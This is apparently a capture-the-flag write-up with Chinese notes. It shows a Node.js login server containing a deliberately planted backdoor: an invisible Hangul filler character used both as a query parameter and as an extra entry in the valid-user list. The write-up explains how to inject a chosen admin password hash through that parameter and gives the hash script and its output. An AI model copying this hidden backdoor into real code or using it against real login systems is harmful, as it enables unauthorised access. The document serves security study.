```js
// node main.js
const fs = require("fs");
const crypto = require('crypto');
const express = require('express');
const escape = require('escape-html')
var favicon = require('serve-favicon');
const app = express();

app.use(favicon('favicon.ico'));
app.set('view engine', 'ejs');
app.use(express.static('public'));

app.get('/login', async (req, res) => {
    try {
        // 使用视觉为空白的后门参数 `ㅤ`
        const { username, password,ㅤ} = req.query;

        // We changed all those passwords after Mr. Martin left the company
        // 后门参数 `ㅤ` 位于验证用户列表中
        const validUsers = [
            'admin:W7tgTzWTFBDedWf+OhrrqfLgYAh7blYh0RuhakKLKqQ=',
            'alice:K9gGyX8OAK8aH8Myj6djqSaXI8jbj6xPk69x2xhtbpA=',
            'bob:WsOfjLfA9phADg4FnzcUrtKOXc4hByHUsBpX02PvrSM=',ㅤ
        ];

        const hash = crypto.createHash('sha256').update(password).digest('base64');
        const check = username + ":" + hash;
        var login = "";
        validUsers.forEach(validPair => {
            if (check == validPair) {
                login = validPair.split(":")[0];
            }
        });

        if (login == "") {
            res.status(403);
            res.render("pages/feedback", {
                type: "warning",
                msg: "Authentication failed.",
            });
            return res.end();
        }

        if (login == "admin") {
            var flag = fs.readFileSync("flag.txt");
            res.status(200);
            res.render("pages/feedback", {
                type: "success",
                msg: "Welcome back admin! " + flag,
            });
            return res.end();
        }

        res.status(200);
        res.render("pages/feedback", {
            type: "success",
            msg: "Welcome back " + login + "!",
        });
        return res.end();

    } catch (e) {
        return res.redirect("/");
    }
});

app.get('/source', async (req, res) => {
    const source = fs.readFileSync(__filename);
    res.render("pages/source", {
        source: escape(source),
    });
    return res.end();
});

...

app.listen(8000);
```
- 已知路径 `pages/*`
- 使用列表/字典尾部添加 `,` 的语法风格
- 不可见字符形式的后门参数 `ㅤ` 存在于 GET 请求参数与用户验证列表中，设置用户与任意密码以使用其身份登录
    - 使用相同密码 hash 构造
        ```js
        // test.js
        const crypto = require('crypto');

        const username = 'admin', password = 'foo';

        const hash = crypto.createHash('sha256').update(password).digest('base64');
        const check = username + ":" + hash;
        console.log(check)
        ```

    - 执行得到 `admin, foo` 作为令牌时的后门字符串
        ```sh
        node test.js
        admin:LCa0a2j/xo/5m0U8HTBBNBNCLXBkg7+g+YpeiGJm564=
        ```
